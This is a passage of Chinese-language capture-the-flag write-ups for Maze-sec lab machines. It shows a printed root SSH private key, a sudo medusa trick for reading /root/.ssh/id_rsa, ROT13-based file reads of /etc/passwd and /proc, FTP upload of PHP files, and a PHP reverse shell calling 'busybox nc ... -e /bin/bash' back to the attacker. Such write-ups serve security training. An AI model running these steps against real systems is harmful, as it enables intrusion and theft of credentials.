KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAuo7fDpWRyh52wo83HNHA5DwnBTEx1Y/hs7jnh5GCIBMxK9kg0A9d<br>aKHnmsDfnG22fr9ZB3XGDJjZpg86E4MGmzXAQ2FMZfcy0vJ90CIQ4kKrvzj2XvWpu+BkMZ<br>ibARGcZa0hzOk+RtbFnWGWWOUx0cTtNiEEWx3v43k8ELG1guQ4PU0jIlV6D70F2R9P6tfn<br>BOxr88YSnSsQu0RErnfg+TR2Vs1EGBpC2vY9yhQOn2X3XeCL2ewznq21DLojMkeW/1lyPn<br>j/isRTkYXToi+qG+B5KheUtJSGcXb9YMDM4kbCJ0EzRY2lkcZ8Lu8c+6Xyr46nzCKLcx4l<br>o13VHNraz6nA1gZZJCOhsaX8h7qdDp4bFFAkDEsIEdWJn3oygQ6HuddXfqlJ+lxw6+ANRw<br>jeGQoLCKj1ut0y5AbFmXvNY+DqaFiQr1YbvuWfm7L2l53ca3HMkK0HytG0o7VzAkyLGUpZ<br>yv+sF4sspTwdxT7UBt8RVmdOBdU8KhwOgqojj0+rAAAFgCbRPJIm0TySAAAAB3NzaC1yc2<br>EAAAGBALqO3w6VkcoedsKPNxzRwOQ8JwUxMdWP4bO454eRgiATMSvZINAPXWih55rA35xt<br>tn6/WQd1xgyY2aYPOhODBps1wENhTGX3MtLyfdAiEOJCq7849l71qbvgZDGYmwERnGWtIc<br>zpPkbWxZ1hlljlMdHE7TYhBFsd7+N5PBCxtYLkOD1NIyJVeg+9BdkfT+rX5wTsa/PGEp0r<br>ELtERK534Pk0dlbNRBgaQtr2PcoUDp9l913gi9nsM56ttQy6IzJHlv9Zcj54/4rEU5GF06<br>IvqhvgeSoXlLSUhnF2/WDAzOJGwidBM0WNpZHGfC7vHPul8q+Op8wii3MeJaNd1Rza2s+p<br>wNYGWSQjobGl/Ie6nQ6eGxRQJAxLCBHViZ96MoEOh7nXV36pSfpccOvgDUcI3hkKCwio9b<br>rdMuQGxZl7zWPg6mhYkK9WG77ln5uy9ped3GtxzJCtB8rRtKO1cwJMixlKWcr/rBeLLKU8<br>HcU+1AbfEVZnTgXVPCocDoKqI49PqwAAAAMBAAEAAAGBALdrFJ9QKqBfxz+Ocw8gotdC1N<br>JkBa0E41FB8FD3nMpQVD3aIkqtcJcY547dJnyz2YNQOgX9oxRri0GbIuxgHDSpajhVBzoR<br>CqUfyNbDR3pNNnKxXHkMay7OdXPVqEAqwmutBthiUdpv+qa7dYg8/vhQ9zAK0i+LhXlOju<br>GS9vST0T9kAbEV/QZQP9my0W4Bi57pm1F3YoGn/7E+c5BdSJF7JQY+lj5kQ2roQuPVSHMr<br>W0OvK5C8jBvsiV7T+xrKClt9OEseNufcUUA5iaKI+G4qwx3znjt548FxxF6q2Jlp5pEThP<br>AMBPFQvb99HL3MNF/paO2lczp9Jl5puiHOAUBF7lAgGsIYPU3wo5GaWl3IEYnfn7lXziB8<br>iVkP0K/gx4yauF159H4IMP7pmh0rDRxLdW2h2GCc2vspJpD9mQ8dBemG+6fUHTJzfgFwR0<br>eTHDHJtzj5q5yK4g/5zaRS8+Vx4iTBYw/aBzWr1WkP4OkmLWyx6NZXzEkw/MxdJyF/oQAA<br>AMAchGFcfzr4d/Rv+Q1eaFzNVGFVAmiW2H2Sz9lOZAXw/jARJww9B3Zg3M9q+b5w4SVMeQ<br>HJYjgWPy97/KkQZR5U4MC8Ds7zyQY3AhlqJvcDIZeTFMXt44qWmaKiQy2KciVIW30+UAtO<br>GOBqPoykzbwgLmh5hJmQGpgzssgMhOM7hIcRMP/Ymhsyw8ok9++FEqSN9mUiXSGR7WbGke<br>esb99CYOsc7YCJ0EeZJJEhQIxwFg094NDCjK83j5yOrDssfNIAAADBAN83PifBNXGdRFN0<br>nF5r4QSW1wDQ0CHHOZt0zXYbpjyxASFhtTWfEci5AXWz9jL4qFCLBx77jNfabalhRPlz8E<br>8Gavf8rssqD8+ZcHr/bAPSlfxY9Q+5L6FKAdKl7x70qNiYp7btyAuGFWKfn+lH4sSFCVBA<br>MSDsXSQvL5bB6CGFLASboZJLNYO+0iYJ5nGZch+B3HQQ+sk52A3ipR5Om1Trk+ZelV5iH7<br>uMDrSz1Co+0ozDPmfvo9PGrttYqmPpaQAAAMEA1fVTHfJmX8vv4IGthLzeWaosc90bjiMY<br>70FX+KImdoi26V61rccY2IBL6X4KffrL1jTuET12czbwGgZh3KpHbFrXNsc/jxV+sUKVJa<br>aKLFd+UNjg756RvevzBMXr5c9ewE6hcdNiwKDBxkBqSbuiBr+oeSMg0G4ppwCGg+G0lBd/<br>ltoRV5MXeIxoYZ6B/jrAbc/Y9kQZ0ozcoSe3zMViGiY++TQf2TPkhiBvu8bRY4vy19nl1c<br>mM/HtQ/t5mUZnzAAAACnJvb3RAQmFzaWM=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>获得ROOT权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/basic]<br>└─# ssh root@192.168.2.48 -i id_rsa<br>Linux Basic 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94<br>root@Basic:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Basic:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-c065860911bb44a2483c096cbd203df9&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h1 id="1、Basic认证"><a href="#1、Basic认证" class="headerlink" title="1、Basic认证"></a>1、Basic认证</h1><p>在 HTTP 中，基本认证（Basic access authentication）是一种用来允许网页浏览器或其他客户端程序在请求时提供用户名和密码形式的身份凭证的一种登录验证方式。 在基本认证中，请求包含一个格式为 <code>Authorization: Basic &lt;credentials&gt;</code> 的头部字段，其中<code> credentials</code> 是用户名和密码的 Base64 编码，用一个冒号 <code>:</code> 连接。</p><h1 id="2、提权-medusa"><a href="#2、提权-medusa" class="headerlink" title="2、提权-medusa"></a>2、提权-medusa</h1><p>medusa可以读取文件内容<br><code>sudo medusa -H /root/.ssh/id_rsa -u root -p root -M ssh</code></p>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Basic认证</tag>
      
      <tag>sudo-medusa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13max</title>
    <link href="/Maze-sec/13max/"/>
    <url>/Maze-sec/13max/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# nmap -sn 192.168.2.0/24                                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 21:35 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00049s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00033s latency).<br>MAC Address: 08:00:27:2D:59:D9 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.47<br>Host is up (0.00087s latency).<br>MAC Address: 08:00:27:8B:C0:DF (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.08 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.47</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# nmap --min-rate 10000 -p- 192.168.2.47                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 21:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.47<br>Host is up (0.00021s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8B:C0:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.39 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>21，22，80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p21,22,80 192.168.2.47<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 13:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.47<br>Host is up (0.00085s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     pyftpdlib 2.0.1<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|  Connected to: 192.168.2.47:21<br>|  Waiting <span class="hljs-keyword">for</span> username.<br>|  TYPE: ASCII; STRUcture: File; MODE: Stream<br>|  Data connection closed.<br>|_End of status.<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: File Unlocker<br>MAC Address: 08:00:27:8B:C0:DF (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.26 seconds<br></code></pre></td></tr></table></figure><p><code>21端口</code>：开放的服务是<code>pyftplib</code></p><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# nmap -sU --top-ports 100 192.168.2.47 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 21:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.47<br>Host is up (0.00078s latency).<br>All 100 scanned ports on 192.168.2.47 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 56 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:8B:C0:DF (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.89 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问<code>80</code>端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507082139952.png"><br>需要我们输入加密的路径，去解锁掩藏的文件</p><ul><li>访问<code>welcome</code>，发现路径变为<code>jrypbzr.gkg</code></li><li>访问<code>config</code>，发现路径变为<code>pbasvt.gkg</code></li><li>访问<code>readme</code>，发现路径<code>ernqzr.gkg</code></li></ul><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.47 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.47<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              txt,html,bak,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/index.php            (Status: 200) [Size: 3350]<br>/welcome.txt          (Status: 200) [Size: 180]<br>/config.txt           (Status: 200) [Size: 48]<br>/readme.txt           (Status: 200) [Size: 83]<br>/logs                 (Status: 301) [Size: 311] [--&gt; http://192.168.2.47/logs/]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>进行目录扫描，发现<code>welcome.txt</code>对应<code>jrypbzr.gkg</code>，<code>config.txt</code>对应<code>pbasvt.gkg</code>，<code>readme.txt</code>对应<code>ernqzr.gkg</code><br>经过测试发现，输入的路径需要经过<code>rot13</code>编码</p><h2 id="2、ROT13读取文件"><a href="#2、ROT13读取文件" class="headerlink" title="2、ROT13读取文件"></a>2、ROT13读取文件</h2><p>尝试将<code>/etc/passwd</code>编码后，进行输入，发现能够成功读取文件，同时发现两个用户<code>welcome，max</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507082148989.png"></p><p>同时访问<code>logs</code>，发现存在文件<code>ftp_server.log</code>，是ftp的登录日志，同时发现开放着<code>pid366</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# curl http://192.168.2.47/logs/ftp_server.log<br>2025-07-08 10:00:32,651 - INFO - concurrency model: async<br>2025-07-08 10:00:32,651 - INFO - masquerade (NAT) address: None<br>2025-07-08 10:00:32,658 - INFO - passive ports: None<br>2025-07-08 10:00:32,658 - INFO - &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=366 &lt;&lt;&lt;<br></code></pre></td></tr></table></figure><p>尝试去读取PID里面的内容，<code>/proc</code> 目录存储了所有进程的运行时信息，每个pid对应一个子目录，发现存在目录<code>/opt/ftp_server.py</code></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507082202279.png"></p><p>读取<code>/opt/ftp_server.py</code>，找到了ftp的用户名和密码：<code>ADMIN:12345</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> FTPHandler<br><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer<br><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><br>LOG_DIR = <span class="hljs-string">&quot;/var/www/html/logs&quot;</span><br>LOG_FILE = os.path.join(LOG_DIR, <span class="hljs-string">&quot;ftp_server.log&quot;</span>)<br><br>os.makedirs(LOG_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br>logging.basicConfig(<br>    filename=LOG_FILE,<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomFTPHandler</span>(<span class="hljs-title class_ inherited__">FTPHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_connect</span>(<span class="hljs-params">self</span>):<br>        logging.info(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;self.remote_ip&#125;</span>:<span class="hljs-subst">&#123;self.remote_port&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_disconnect</span>(<span class="hljs-params">self</span>):<br>        logging.info(<span class="hljs-string">f&quot;Disconnected <span class="hljs-subst">&#123;self.remote_ip&#125;</span>:<span class="hljs-subst">&#123;self.remote_port&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_login</span>(<span class="hljs-params">self, username</span>):<br>        logging.info(<span class="hljs-string">f&quot;User logged in: <span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_logout</span>(<span class="hljs-params">self, username</span>):<br>        logging.info(<span class="hljs-string">f&quot;User logged out: <span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_file_sent</span>(<span class="hljs-params">self, file</span>):<br>        logging.info(<span class="hljs-string">f&quot;File sent: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_file_received</span>(<span class="hljs-params">self, file</span>):<br>        logging.info(<span class="hljs-string">f&quot;File received: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_incomplete_file_sent</span>(<span class="hljs-params">self, file</span>):<br>        logging.warning(<span class="hljs-string">f&quot;Incomplete file sent: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_incomplete_file_received</span>(<span class="hljs-params">self, file</span>):<br>        logging.warning(<span class="hljs-string">f&quot;Incomplete file received: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    authorizer = DummyAuthorizer()<br>    authorizer.add_user(<span class="hljs-string">&quot;ADMIN&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, perm=<span class="hljs-string">&quot;elradfmw&quot;</span>)<br><br>    handler = CustomFTPHandler<br>    handler.authorizer = authorizer<br><br>    address = (<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">21</span>)<br>    server = FTPServer(address, handler)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Starting FTP server on <span class="hljs-subst">&#123;address[<span class="hljs-number">0</span>]&#125;</span>:<span class="hljs-subst">&#123;address[<span class="hljs-number">1</span>]&#125;</span>, logging to <span class="hljs-subst">&#123;LOG_FILE&#125;</span>&quot;</span>)<br>    server.serve_forever()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="四、FTP渗透"><a href="#四、FTP渗透" class="headerlink" title="四、FTP渗透"></a>四、FTP渗透</h1><p>根据找到的用户名和密码，进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# ftp 192.168.2.47<br>Connected to 192.168.2.47.<br>220 pyftpdlib 2.0.1 ready.<br>Name (192.168.2.50:root): ADMIN<br>331 Username ok, send password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering extended passive mode (|||48819|).<br>125 Data connection already open. Transfer starting.<br>-rw-r--r--   1 root     root         1607 Jul 05 02:27 ftp_server.py<br>226 Transfer complete.<br></code></pre></td></tr></table></figure><h2 id="1、put-shell"><a href="#1、put-shell" class="headerlink" title="1、put-shell"></a>1、put-shell</h2><p>上传一个反弹的shell，发现不解析，尝试上传<code>phpinfo()</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php  phpinfo();?&gt;&quot;</span> &gt;&gt; phpinfo.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; put phpinfo.txt <br><span class="hljs-built_in">local</span>: phpinfo.txt remote: phpinfo.txt<br>229 Entering extended passive mode (|||43785|).<br>125 Data connection already open. Transfer starting.<br>100% |**************************************************************************************************|    20       72.07 KiB/s    00:00 ETA<br>226 Transfer complete.<br>20 bytes sent <span class="hljs-keyword">in</span> 00:00 (5.82 KiB/s)<br></code></pre></td></tr></table></figure><p>访问<code>/opt/phpinfo.txt</code>，找到被禁用的函数<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507082216060.png"></p><h2 id="2、get-shell"><a href="#2、get-shell" class="headerlink" title="2、get-shell"></a>2、get-shell</h2><p>使用下面的shell进行反弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/13max]<br>└─# <span class="hljs-built_in">cat</span> rev.txt                                                                   <br>&lt;?php<br>  <span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/bash&quot;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>访问<code>/opt/rev.txt</code>，成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444                        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.47] 41246<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@13max:/var/www/html$ <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong><br>在<code>welcome</code>用户下面，找到<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@13max:/home/welcome$ <span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 3 welcome welcome 4096 Jul  4 11:03 .<br>drwxr-xr-x 4 root    root    4096 Jul  4 08:55 ..<br>lrwxrwxrwx 1 root    root       9 Jul  4 11:03 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 